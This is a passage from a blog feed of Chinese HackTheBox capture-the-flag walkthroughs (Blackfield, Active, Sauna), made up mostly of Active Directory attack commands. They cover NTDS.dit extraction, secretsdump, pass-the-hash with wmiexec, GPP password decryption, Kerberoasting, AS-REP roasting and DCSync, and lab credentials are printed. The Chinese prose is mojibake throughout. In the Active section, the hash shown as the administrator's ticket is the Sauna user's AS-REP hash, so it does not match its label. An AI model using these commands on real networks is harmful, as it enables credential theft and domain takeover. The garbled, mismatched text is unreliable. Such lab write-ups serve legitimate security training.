alt="image-20240711202615153"></p><p>æ‰§è¡Œ<code>diskshadow</code>å¹¶ä½¿ç”¨è„šæœ¬æ–‡ä»¶ä½œä¸ºå…¶è¾“å…¥</p><p><code>cmd /c diskshadow /s cmd.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711203325908-369933739.png" alt="image-20240711203321708"></p><p>å°†å¤‡ä»½<code>ntds.dit</code>æ–‡ä»¶ç§»åŠ¨åˆ°å½“å‰æ–‡ä»¶å¤¹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robocopy /b z:\windows\ntds\ .\ NTDS.dit</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204452433-847416599.png" alt="image-20240711204448694"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204526369-88572884.png" alt="image-20240711204522630"></p><p>ä»æ³¨å†Œè¡¨ä¸­è·å–<code>system.hive</code>æ–‡ä»¶</p><p><code>reg save HKLM\SYSTEM .\system.hive</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711205054759-313412363.png" alt="image-20240711205050633"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç°åœ¨å·²ç»è·å¾—äº†<code>NTDS.dit</code>å’Œ<code>system.hive</code>ï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download ntds.dit</span><br><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>secretsdump.py</code> è§£æ <code>NTDS.dit</code></p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive local</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712141900243-2116055538.png" alt="image-20240712141859105"></p><p>æ‹¿åˆ°<code>administrator</code>çš„<code>hash</code></p><h2 id="ä½¿ç”¨wmiexecè¿›è¡ŒPTH"><a href="#ä½¿ç”¨wmiexecè¿›è¡ŒPTH" class="headerlink" title="ä½¿ç”¨wmiexecè¿›è¡ŒPTH"></a>ä½¿ç”¨wmiexecè¿›è¡ŒPTH</h2><p>é€šè¿‡<code>wmiexec.py</code>é€šè¿‡<code>hash</code>æ¥ç™»å½•åˆ°ç®¡ç†å‘˜è´¦æˆ·</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142129871-935519493.png" alt="image-20240712142125899"></p><p>ç°åœ¨å·²ç»æ˜¯ç®¡ç†å‘˜æƒé™äº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142629505-762298768.png" alt="image-20240712142625352"></p><p>æœ€ååœ¨<code>Administrator</code>çš„<code>Desktop</code>ä¸Šæ‰¾åˆ°<code>root.txt</code>ä»¥åŠ<code>notes.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Blackfield</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Active</title>
    <link href="https://www.fomal.cc/posts/79fbfa03.html"/>
    <id>https://www.fomal.cc/posts/79fbfa03.html</id>
    <published>2024-07-05T01:38:14.000Z</published>
    <updated>2024-10-06T08:24:57.827Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.100</p><p>æ”»å‡»æœºipï¼š10.10.14.12</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>ç»„ç­–ç•¥å®‰å…¨é—®é¢˜</li><li>kerberoastingæ”»å‡»</li><li>smbclientå·¥å…·ä½¿ç”¨</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708130024551-1884352902.png" alt="image-20240708130022178"></p><p>å‘ç°æœ‰<code>kerberos</code>æœåŠ¡ï¼Œ<code>smb</code>æœåŠ¡ï¼Œ<code>ldap</code>æœåŠ¡ï¼ŒåŸŸåä¸º <code>active.htb</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L \\10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708131335828-1229634342.png" alt="image-20240708131333628"></p><p>å‘ç°åŒ¿åç™»é™†æˆåŠŸï¼Œå¹¶å¾—åˆ°ä¸€äº›å¯ä»¥è®¿é—®çš„å…±äº«èµ„æºï¼Œè¿›ä¸€æ­¥æ¢æµ‹</p><p><code>smbmap -H 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708134451917-1771966004.png" alt="image-20240708134449415"></p><p>å¯ä»¥çœ‹åˆ°åŒ¿åç”¨æˆ·å¯¹ <code>Replication</code> æ–‡ä»¶å¤¹å…·æœ‰ <code>READ ONLY</code> æƒé™ï¼Œå°è¯•è®¿é—®</p><p><code>smbclient //10.10.10.100/Replication</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708135139603-190151919.png" alt="image-20240708135137253"></p><h1 id="ç»„ç­–ç•¥GPPå¯†ç è§£å¯†"><a href="#ç»„ç­–ç•¥GPPå¯†ç è§£å¯†" class="headerlink" title="ç»„ç­–ç•¥GPPå¯†ç è§£å¯†"></a>ç»„ç­–ç•¥GPPå¯†ç è§£å¯†</h1><blockquote><p>å½“åˆ›å»ºæ–°çš„ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼ˆGPPï¼‰æ—¶ï¼Œåœ¨ C:\Windows\SYSVOL ä¸­ä¼šåˆ›å»ºä¸€ä¸ªä¸ç›¸å…³é…ç½®æ•°æ®ç›¸å…³è”çš„XMLæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸ GPP å…³è”çš„ä»»ä½•å¯†ç ã€‚ä¸ºäº†å®‰å…¨èµ·è§ï¼ŒMicrosoft AES åœ¨å°†å¯†ç å­˜å‚¨ä¸º cpassword ä½†éšåå¾®è½¯åœ¨ MSDN ä¸Šå‘å¸ƒäº†å¯†é’¥ã€‚<br>ç”±äºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ˆä»»ä½•åŸŸç”¨æˆ·æˆ–å—ä¿¡ä»»åŸŸä¸­çš„ç”¨æˆ·ï¼‰éƒ½å…·æœ‰å¯¹SYSVOLçš„è¯»å–æƒé™ï¼Œæ‰€ä»¥åŸŸä¸­çš„ä»»ä½•äººéƒ½å¯ä»¥æœç´¢åŒ…å«â€œcpasswordâ€çš„XMLæ–‡ä»¶çš„SYSVOLå…±äº«ï¼Œè¯¥æ–‡ä»¶æ˜¯åŒ…å«AESåŠ å¯†å¯†ç çš„å€¼ã€‚</p><p>æ‰€æœ‰åŸŸç»„ç­–ç•¥éƒ½å­˜å‚¨åœ¨ï¼š\ SYSVOL \ Policies \</p></blockquote><p>ä½¿ç”¨<code>smbclient</code>å°è¯•è®¿é—®è¯¥ç›®å½•çš„æ–‡ä»¶ï¼Œæœ€ååœ¨<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>ç›®å½•ä¸‹å‘ç°<code>Groups.xml</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141318506-1037427827.png" alt="image-20240708141316123"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141329701-245755982.png" alt="image-20240708141327727"></p><p>å¯ä»¥æ‹¿åˆ°ä¸€å¯¹ç”¨æˆ·åå’Œ<code>GPP</code>å¯†ç </p><p><code>active.htb\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p><p>ç”±äºå¯†é’¥æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Kali</code>ä¸Šçš„å·¥å…·<code>gpp-decrypt</code>æ¥è§£å¯†</p><p><code>gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708142501970-1727130224.png" alt="image-20240708142457314"></p><blockquote><p>active.htb\SVC_TGS</p><p>GPPstillStandingStrong2k18</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªåŸŸç”¨æˆ·çš„è´¦å·å’Œæ˜æ–‡å¯†ç ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å†æ¥å°è¯•é€šè¿‡<code>SMB</code>ç™»å½•</p><p><code>smbclient //10.10.10.100/Users -U SVC_TGS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144846574-1126980413.png" alt="image-20240708144844053"></p><p>æœ€ååœ¨<code>SVC_TGS</code>ç”¨æˆ·çš„<code>Desktop</code>å¾—åˆ°<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144937195-1629946426.png" alt="image-20240708144935287"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144943344-1994666938.png" alt="image-20240708144941529"></p><h1 id="kerberoastingæ”»å‡»"><a href="#kerberoastingæ”»å‡»" class="headerlink" title="kerberoastingæ”»å‡»"></a>kerberoastingæ”»å‡»</h1><blockquote><p>æ”»å‡»åŸç†ï¼š</p><p>â€‹            <code>Kerberoasting</code> æ˜¯æµè¡Œçš„ <code>AD Kerberos</code> æ”»å‡»ä¹‹ä¸€ï¼ŒKerberoasting æ˜¯ä¸€ç§å…è®¸æ”»å‡»è€…çªƒå–ä½¿ç”¨ RC4 åŠ å¯†çš„ <code>KRB_TGS</code> ç¥¨è¯çš„æŠ€æœ¯ï¼Œä»¥æš´åŠ›ç ´è§£åº”ç”¨ç¨‹åºæœåŠ¡å“ˆå¸Œä»¥æå–å…¶å¯†ç ã€‚  åœ¨æ­¤æ”»å‡»ä¸­ï¼Œä»<code>Active Directory</code>ä¸­æå–æœåŠ¡å¸æˆ·çš„å‡­æ®å“ˆå¸Œå¹¶ç¦»çº¿ç ´è§£ã€‚æˆ‘ä»¬éœ€è¦ç¡®å®šå“ªäº›å¸æˆ·æ˜¯<code>kerberoastable</code>ï¼Œç„¶åä½œä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºç›®æ ‡æœåŠ¡å¸æˆ·è¯·æ±‚æœåŠ¡ç¥¨è¯  (TGS)ï¼Œè€Œæ— éœ€å‘è¿è¡ŒæœåŠ¡çš„ç›®æ ‡æœåŠ¡å™¨å‘é€ä»»ä½•æµé‡ã€‚</p></blockquote><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ<code>kerberoasting</code> çš„é‡ç‚¹æ˜¯å‘ <code>KDC</code> è¯·æ±‚ <code>TGS</code>ã€‚æ­¤æ”»å‡»ä»…æ¶‰åŠçªå‡ºæ˜¾ç¤ºçš„æ­¥éª¤ 3 å’Œ 4ã€‚</p><p><img src="https://rootdse.org/assets/images/0006-active-directory-security-2/kerberoasting_flow.png" alt="Kerberos Authentication flow)"></p><p>å¯ä»¥ä½¿ç”¨<code>Impacket</code> ä¸­çš„è„šæœ¬<code>GetUserSPNs.py</code>æ¥è·å–ä¸<code>SVC_TGS</code>ç”¨æˆ·å¸æˆ·ç›¸å…³è”çš„æœåŠ¡çš„ç”¨æˆ·ååˆ—è¡¨</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708151704422-1431746945.png" alt="image-20240708151701799"></p><p>è¿™æ ·å°±æ‹¿åˆ°äº†ä¸€å¼ ç®¡ç†å‘˜æœåŠ¡ç¥¨æ®ï¼ˆTGSï¼‰</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>john</code>ç ´è§£</p><p>å°†ä¸Šè¿°ç¥¨æ®ä¿å­˜ä¸º<code>hash</code>ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´<code>hash</code>å€¼</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708153350228-1991754535.png" alt="image-20240708153348021"></p><p><code>Ticketmaster1968</code></p><p>é€šè¿‡<code>smbclient</code>ç™»å½•<code>administrator</code></p><p><code>smbclient -U administrator //10.10.10.100/Users</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090439214-1141233570.png" alt="image-20240709090438584"></p><p>æœ€ååœ¨<code>Desktop</code>ç›®å½•æ‹¿åˆ°<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090433888-136269028.png" alt="image-20240709090433121"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090426341-1460306309.png" alt="image-20240709090425370"></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Active</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Sauna</title>
    <link href="https://www.fomal.cc/posts/5551a214.html"/>
    <id>https://www.fomal.cc/posts/5551a214.html</id>
    <published>2024-07-02T05:42:59.000Z</published>
    <updated>2024-10-06T08:24:43.303Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.175</p><p>æ”»å‡»æœºipï¼š10.10.14.13</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>AS-REP Roasting</li><li>BloodHoundä¿¡æ¯æœé›†</li><li>DCSyncææƒ</li><li>PTHä¼ é€’æ”»å‡»</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p>nmapæ‰«ä¸€ä¸‹</p><p><code>nmap -sS -sV -sC 10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705135044409-1259975882.png" alt="image-20240705135030653"></p><p>å‘ç°æœ‰<code>web</code>æœåŠ¡ï¼Œ<code>DNS</code>æœåŠ¡ï¼Œ<code>Kerberos</code>æœåŠ¡ï¼Œ<code>smb</code>å…±äº«æœåŠ¡ï¼Œ<code>RPC</code>æœåŠ¡ï¼Œ<code>LDAP</code>æœåŠ¡ï¼Œæœ‰ADåŸŸ</p><p>å¾—åˆ°ä¸€ä¸ªåŸŸå<code>EGOTISTICAL-BANK.LOCAL</code></p><p>å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>å°è¯•åŒ¿åç™»å½•SMBæœåŠ¡</p><p><code>smbclient -N -L \\10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705140443576-595990783.png" alt="image-20240705140430156"></p><p>åŒ¿åç™»é™†æˆåŠŸï¼Œä½†æ˜¯å¹¶æ— é‡è¦ä¿¡æ¯</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>å°è¯•ä½¿ç”¨ldapsearchå·¥å…·å°è¯•è·å–åŸŸä¸­çš„ç”¨æˆ·ï¼Œæ ¹æ®ä¹‹å‰å¾—åˆ°çš„åŸŸå<code>EGOTISTICAL-BANK.LOCAL</code>æ„é€ å¦‚ä¸‹å‘½ä»¤</p><p><code>ldapsearch -x -H ldap://10.10.10.175  -b &quot;dc=Egotistical-bank,dc=local&quot; | grep &quot;dn:&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141252587-707688598.png" alt="image-20240705141239128"></p><p>è·å–åˆ°ä¸€ä¸ªå¯èƒ½å«åš<code>Hugo Smith</code>çš„ç”¨æˆ·</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>å°è¯•<code>RPC</code>ç©ºè´¦å·ç™»å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141727490-1030070414.png" alt="image-20240705141714174"></p><p><code>RPC</code>æ‹’ç»è¿æ¥</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>åœ¨é¡µé¢ä¸­ï¼Œæ‰¾åˆ°å¦‚ä¸‹å§“å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141529895-1920992009.png" alt="image-20240705141516397"></p><blockquote><p>Fergus Smith </p><p>Shaun Coins </p><p>Hugo Bear </p><p>Steven Kerb </p><p>Bowie Taylor </p><p>Sophie Driver</p></blockquote><h2 id="kerbruteç”¨æˆ·åæšä¸¾"><a href="#kerbruteç”¨æˆ·åæšä¸¾" class="headerlink" title="kerbruteç”¨æˆ·åæšä¸¾"></a>kerbruteç”¨æˆ·åæšä¸¾</h2><p>å°è¯•é€šè¿‡<code>kerbrute</code>åˆ—å‡ºä½¿ç”¨è€…ï¼Œå­—å…¸ä½¿ç”¨çš„æ˜¯<code>seclists</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705154300732-2114639653.png" alt="image-20240705154247314"></p><p>å¯ä»¥çœ‹åˆ°æœ‰<code>hsmith</code>å’Œ<code>fsmith</code>ç”¨æˆ·</p><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>å°†ä¸¤ä¸ªç”¨æˆ·åä¿å­˜åˆ°<code>user.txt</code>ï¼Œå°è¯•ä¸€ä¸‹<code>AS-REP Roasting</code>æ”»å‡»</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt  -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705165616305-146200250.png" alt="image-20240705165602974"></p><p>æ‹¿åˆ°<code>fsmith</code>ç”¨æˆ·çš„<code>hash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>john</code>ç ´è§£</p><p>å°†ä¸Šè¿°ç¥¨æ®ä¿å­˜ä¸º<code>hash</code>ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´<code>hash</code>å€¼</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705170725588-1732545966.png" alt="image-20240705170711853"></p><p>æ‹¿åˆ°<code>fsmith</code>çš„å‡­è¯<code>fsmith:Thestrokes23</code></p><p>å°è¯•è¿œç¨‹ç™»é™†</p><p><code>evil-winrm -i 10.10.10.175 -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171004310-183933394.png" alt="image-20240705170949902"></p><p>ç™»å½•æˆåŠŸ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171705037-1061082570.png" alt="image-20240705171651372"></p><p>æœ€ååœ¨æ¡Œé¢ä¸Šæ‹¿åˆ°<code>user.txt</code></p><h1 id="æ³¨å†Œè¡¨è·å–ç”¨æˆ·å¯†ç "><a href="#æ³¨å†Œè¡¨è·å–ç”¨æˆ·å¯†ç " class="headerlink" title="æ³¨å†Œè¡¨è·å–ç”¨æˆ·å¯†ç "></a>æ³¨å†Œè¡¨è·å–ç”¨æˆ·å¯†ç </h1><p>åœ¨<code>Users</code>ç›®å½•ä¸‹å‘ç°æ–°ç”¨æˆ·<code>svc_loanmgr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706125236729-1214413985.png" alt="image-20240706125235716"></p><p>é€šè¿‡æŸ¥è¯¢<code>Winlogon</code>æ³¨å†Œè¡¨æ¥æ‰‹åŠ¨æ”¶é›†ä¿¡æ¯</p><p><code>reg.exe query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706130913738-871033410.png" alt="image-20240706130910599"></p><p>æ‹¿åˆ°ç”¨æˆ·åå¯†ç <code>svc_loanmanager : Moneymakestheworldgoround!</code></p><p>ä½†æ˜¯é€šè¿‡ç™»å½•å‘ç°<code>svc_loanmanager</code>ç™»ä¸ä¸Šï¼Œç™»å½•<code>svc_loanmgr</code>ç™»é™†æˆåŠŸ</p><h1 id="ADåŸŸæ¸—é€æƒé™æå‡"><a href="#ADåŸŸæ¸—é€æƒé™æå‡" class="headerlink" title="ADåŸŸæ¸—é€æƒé™æå‡"></a>ADåŸŸæ¸—é€æƒé™æå‡</h1><h2 id="BloodHoundä¿¡æ¯æœé›†"><a href="#BloodHoundä¿¡æ¯æœé›†" class="headerlink" title="BloodHoundä¿¡æ¯æœé›†"></a>BloodHoundä¿¡æ¯æœé›†</h2><p>ç™»å½•<code>svc_loanmgr</code>ç”¨æˆ·</p><p><code>evil-winrm -i 10.10.10.175 -u &#39;svc_loanmgr&#39; -p &#39;Moneymakestheworldgoround!&#39;</code></p><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>bloodhound</code>è¿›è¡Œä¿¡æ¯æœé›†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Sauna/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240706064043_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151303740-1966923458.png" alt="image-20240706151302995"></p><p>åˆ†æå‘ç°å¯ä»¥åˆ©ç”¨<code>DCSync</code>æ”»å‡»ç›´æ¥åŸŸæ§</p><h2 id="DCSyncææƒ"><a href="#DCSyncææƒ" class="headerlink" title="DCSyncææƒ"></a>DCSyncææƒ</h2><p>ä½¿ç”¨<code>secretsdump.py</code>å·¥å…·æ‰§è¡Œ <code>DCSync</code> ä»¥è½¬å‚¨ç®¡ç†å‘˜ç”¨æˆ·çš„ <code>NTLM</code> å“ˆå¸Œ</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr:&#39;Moneymakestheworldgoround!&#39;@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151914385-627492788.png" alt="image-20240706151913724"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°æ‰€æœ‰ç”¨æˆ·çš„<code>hash</code>ï¼ŒåŒ…æ‹¬<code>admin</code>ç”¨æˆ·çš„</p><h2 id="PTHä¼ é€’æ”»å‡»è·å–Root"><a href="#PTHä¼ é€’æ”»å‡»è·å–Root" class="headerlink" title="PTHä¼ é€’æ”»å‡»è·å–Root"></a>PTHä¼ é€’æ”»å‡»è·å–Root</h2><p>æ‹¿åˆ°äº†ç®¡ç†å‘˜çš„<code>hash</code>ï¼Œå°±å¯ä»¥é€šè¿‡<code>wmiexec</code>å“ˆå¸Œä¼ é€’æ‹¿åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152200125-1504201946.png" alt="image-20240706152159481"></p><p>æˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152456281-1524121811.png" alt="image-20240706152455683"></p><p>æœ€ååœ¨<code>desktop</code>è·å–<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Sauna</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Forest</title>
    <link href="https://www.fomal.cc/posts/1bc19c16.html"/>
    <id>https://www.fomal.cc/posts/1bc19c16.html</id>
    <published>2024-06-27T12:12:35.000Z</published>
    <updated>2024-10-06T08:24:38.950Z</updated>
    
